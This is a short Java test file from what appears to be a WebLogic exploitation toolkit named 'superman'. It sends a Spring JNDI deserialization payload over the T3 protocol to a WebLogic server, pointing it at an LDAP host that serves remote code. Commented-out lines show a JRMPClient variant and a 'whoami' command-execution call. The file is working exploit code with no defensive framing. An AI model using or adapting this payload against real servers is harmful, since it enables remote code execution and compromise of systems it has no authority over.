package superman;

import superman.core.PayloadSend;
import superman.core.Url;
import superman.payloads.SpringJndi;

public class Test {
    public static void main(String[] args) throws Exception {
        /*String url = String.format("%s://%s:%s", "t3", "127.0.0.1", 7001);
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "weblogic.jndi.WLInitialContextFactory");
        env.put(Context.PROVIDER_URL, url);
        env.put("weblogic.jndi.requestTimeout", Store.TIME_OUT);
        InitialContext initialContext = new InitialContext(env);
        initialContext.rebind("sectest",new JRMPClient().getObject(new Url("ldap://172.17.0.1:1389/d48wji")));
*/
        PayloadSend.sendT3("t3","127.0.0.1",7001,new SpringJndi().getObject(new Url("ldap://172.17.0.1:1389/u4mkpx")));
        //System.out.println(((ClusterMasterRemote)initialContext.lookup("sectest")).getServerLocation("whoami"));
        //initialContext.unbind("test");
        //initialContext.unbind("sectest");
    }
}
